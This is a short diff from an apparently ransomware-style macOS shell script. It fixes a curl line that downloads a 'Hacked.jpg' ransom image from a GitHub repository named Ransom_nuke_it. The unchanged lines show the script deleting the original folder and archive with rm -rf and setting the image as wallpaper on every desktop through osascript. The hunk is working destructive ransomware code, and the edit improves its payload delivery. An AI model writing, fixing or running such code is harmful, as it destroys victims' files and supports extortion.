@@ -52,7 +52,7 @@ echo "   Removing original folder and temporary archive ..."
 rm -rf "$TARGET" "$ARCHIVE"
 
 # ---- 6. Drop ransom note and update wallpaper-----------------------------------------------------
-curl -O https://raw.githubusercontent.com/sectorxatwork/Ransom_nuke_it/refs/heads/main/Hacked.jpg ~/Desktop/Hacked.jpg
+curl -o ~/Desktop/Hacked.jpg https://raw.githubusercontent.com/sectorxatwork/Ransom_nuke_it/main/Hacked.jpg
 osascript -e 'tell application "System Events" to set picture of every desktop to "~/Desktop/Hacked.jpg"'
 
 
